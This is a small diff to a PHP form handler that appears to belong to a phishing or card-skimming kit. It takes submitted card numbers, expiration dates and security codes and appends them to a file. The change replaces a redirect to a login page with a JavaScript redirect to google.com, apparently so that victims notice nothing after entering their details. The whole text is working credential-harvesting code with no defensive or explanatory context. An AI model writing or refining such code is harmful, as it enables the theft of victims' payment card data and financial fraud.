@@ -13,9 +13,13 @@ if (
         "cardNumber: " . $_POST['cardNumber'] . "\n" .
         "expirationdate: " . $_POST['expirationdate'] . "\n" .
         "securitycode: " . $_POST['securitycode'] . "\n\n";
+	    file_put_contents($file, $data, FILE_APPEND);
+	  ?>
+<script type="text/javascript">
+window.location = "http://www.google.com/";
+</script>      
+    <?php
 
-    file_put_contents($file, $data, FILE_APPEND);
-    header('Location: login.php'); // Replace with your URL
     exit;
 } else {
     // Log missing fields
